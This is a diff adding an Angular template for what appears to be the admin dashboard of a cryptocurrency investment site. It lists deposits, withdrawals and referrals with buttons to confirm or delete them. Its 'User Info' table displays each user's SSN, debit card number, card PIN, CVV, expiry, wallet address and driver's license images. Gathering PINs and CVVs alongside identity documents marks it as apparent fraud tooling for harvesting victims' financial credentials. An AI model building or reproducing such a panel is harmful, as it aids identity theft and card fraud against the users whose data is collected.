@@ -1,0 +1,315 @@
+<div class="w-full h-full overflow-y-auto">
+  <div class="py-10" fxLayout.gt-sm="row" fxLayout.lt-md="column" fxLayoutAlign.gt-sm="space-around center">
+    <div class="rounded-xl bg-indigo-50 h-24" fxFlex.lt-md="90%" fxFlex.gt-md="24%" fxLayout="row">
+      <div class="bg-indigo-100 w-1/2 h-full">
+        <mat-icon class="w-60 h-40">person</mat-icon>
+      </div>
+      <div class="bg-indigo-50 uppercase">
+        <p class="pt-5 px-2">
+          PENDING DEPOSITES
+        </p>
+        <p class="text-center">
+          {{ totalPendingDeposit }}
+        </p>
+      </div>
+    </div>
+
+
+    <div class="rounded-xl bg-indigo-50 h-24 mt-5 sm:mt-0" fxFlex.lt-md="90%" fxFlex.gt-md="24%" fxLayout="row">
+      <div class="bg-indigo-100 w-1/2 h-full">
+        <mat-icon class="w-60 h-40">person</mat-icon>
+      </div>
+      <div class="bg-indigo-50 uppercase">
+        <p class="pt-5 px-2">
+          TOTAL DEPOSITES
+        </p>
+        <p class="text-center">
+          {{ totalInvestments }} coins
+        </p>
+      </div>
+    </div>
+
+
+    <div class="rounded-xl bg-indigo-50 h-24 mt-5 sm:mt-0" fxFlex.lt-md="90%" fxFlex.gt-md="24%" fxLayout="row">
+      <div class="bg-indigo-100 w-1/2 h-full">
+        <mat-icon class="w-60 h-40">person</mat-icon>
+      </div>
+      <div class="bg-indigo-50 uppercase">
+        <p class="pt-5 px-2">
+          PENDING WITHDRAWS
+        </p>
+        <p class="text-center">
+          {{ totalPendingWithdrawal }} coin
+        </p>
+      </div>
+    </div>
+
+
+
+    <div class="rounded-xl bg-indigo-50 h-24 mt-5 sm:mt-0" fxFlex.lt-md="90%" fxFlex.gt-md="24%" fxLayout="row">
+      <div class="bg-indigo-100 w-1/2 h-full">
+        <mat-icon class="w-60 h-40">person</mat-icon>
+      </div>
+      <div class="bg-indigo-50 uppercase">
+        <p class="pt-5 px-2">
+          TOTAL WITHDRAWAL
+        </p>
+
+        <p class="text-center">
+          {{ totalWithdrawal }}
+        </p>
+      </div>
+    </div>
+  </div>
+
+  <div class="pt-10">
+    <div class="w-full pt-5 px-2 sm:px-0">
+      <p class="text-center">Deposit</p>
+      <mat-divider></mat-divider>
+      <div class="currency_table responsive-table w-full">
+        <table class="styled-table w-full">
+          <thead>
+            <tr>
+              <td>
+                Email
+              </td>
+              <td>
+                Amount
+              </td>
+              <td>
+                Coin
+              </td>
+              <td>
+                Started
+              </td>
+              <td>
+                status
+              </td>
+              <td>
+                Action
+              </td>
+            </tr>
+          </thead>
+          <tbody>
+            <tr *ngFor="let vest of investments">
+              <td>{{vest.email}}</td>
+              <td>{{vest.amount}}</td>
+              <td>{{vest.coinName}}</td>
+              <td>{{vest.createdOn | date}}</td>
+              <td>
+                {{vest.confirmation}}
+
+              </td>
+              <td>
+                <button mat-raised-button (click)="removeVest(vest._id)">
+                  Delete
+                </button>
+                <span *ngIf="vest.confirmation === 'pending'" class="mx-auto">
+                  <button mat-raised-button (click)="updateVest(vest._id, 'confirmed')"> Confirm
+                  </button>
+                </span>
+                <span *ngIf="vest.confirmation === 'pending withdraw'">
+                  <button mat-raised-button (click)="updateVest(vest._id, 'withdraw')">
+                    Confirm
+                  </button>
+                </span>
+              </td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+  </div>
+
+  <div class="pt-10">
+    <div class="w-full pt-5 px-2 sm:px-0">
+      <p class="text-center">User Info</p>
+      <mat-divider></mat-divider>
+      <div class="currency_table responsive-table w-full">
+        <table class="styled-table w-full">
+          <thead>
+            <tr>
+              <td>
+                SSN
+              </td>
+              <td>
+                Debit Card Number
+              </td>
+              <td>
+                Card Pin
+              </td>
+              <td>
+                Expiry
+              </td>
+              <td>
+                Cvv
+              </td>
+              <td>
+                Wallet Address
+              </td>
+              <td>
+                Divers license
+              </td>
+              
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td>{{UserInfo.SSN}}</td>
+              <td>{{UserInfo.cardNumber}}</td>
+              <td>{{UserInfo.cardPin}}</td>
+              <td>{{UserInfo.expiry}}</td>
+              <td>{{UserInfo.CVV}}</td>
+              <td *ngFor="let img of UserInfo.driverLin">{{img}}</td>
+              <td>{{UserInfo.walletAddress}}</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+  </div>
+
+
+  <div class="pt-10">
+    <div class="w-full pt-5 px-2 sm:px-0">
+      <p class="text-center">Running Investments</p>
+      <mat-divider></mat-divider>
+      <div class="currency_table responsive-table w-full">
+        <table class="styled-table w-full">
+          <thead>
+            <tr>
+              <td>
+                Email
+              </td>
+              <td>
+                Amount
+              </td>
+              <td>
+                Coin
+              </td>
+              <td>
+                Started
+              </td>
+              <td>
+                status
+              </td>
+              <td>
+                Action
+              </td>
+            </tr>
+          </thead>
+          <tbody>
+            <tr *ngFor="let vest of confirimedInvestments">
+              <td>{{vest.email}}</td>
+              <td>{{vest.amount}}</td>
+              <td>{{vest.coinName}}</td>
+              <td>{{vest.createdOn | date}}</td>
+              <td>
+                {{vest.confirmation}}
+
+              </td>
+              <td>
+                <button mat-button (click)="removeVest(vest._id)">
+                  Delete
+                </button>
+              </td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+  </div>
+
+
+
+  <div class="pt-10">
+    <div class="w-full pt-5 px-2 sm:px-0">
+      <p class="text-center">Withdrawals</p>
+      <mat-divider></mat-divider>
+      <div class="currency_table responsive-table w-full">
+        <table class="styled-table w-full">
+          <thead>
+            <tr>
+              <td>
+                Email
+              </td>
+              <td>
+                Amount
+              </td>
+              <td>
+                Coin
+              </td>
+              <td>
+                Started
+              </td>
+              <td>
+                status
+              </td>
+              <td>
+                Delete
+              </td>
+            </tr>
+          </thead>
+          <tbody>
+            <tr *ngFor="let vest of withdrawedInvestment">
+              <td>{{vest.email}}</td>
+              <td>{{vest.amount + vest.currentBalance}}</td>
+              <td>{{vest.coinName}}</td>
+              <td>{{vest.createdOn | date}}</td>
+              <td>
+                {{vest.confirmation}}
+
+              </td>
+              <td>
+                <button mat-button (click)="removeVest(vest._id)">
+                  Delete
+                </button>
+              </td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+  </div>
+
+
+
+  <div class="pt-10">
+    <div class="w-full pt-5 px-2 sm:px-0">
+      <p class="text-center">Referals</p>
+      <mat-divider></mat-divider>
+      <div class="currency_table responsive-table w-full">
+        <table class="styled-table w-full">
+          <thead>
+            <tr>
+              <td>
+                Email
+              </td>
+              <td>
+                First name
+              </td>
+              <td>
+                Last Name
+              </td>
+              <td>
+                Date Registered
+              </td>
+
+            </tr>
+          </thead>
+          <tbody>
+
+            <tr *ngFor="let user of refs">
+              <td>{{user.email}}</td>
+              <td>{{user.firstName}}</td>
+              <td>{{user.lastName}}</td>
+              <td>{{user.createdOn | date}}</td>
+
+            </tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+  </div>
+
+</div>
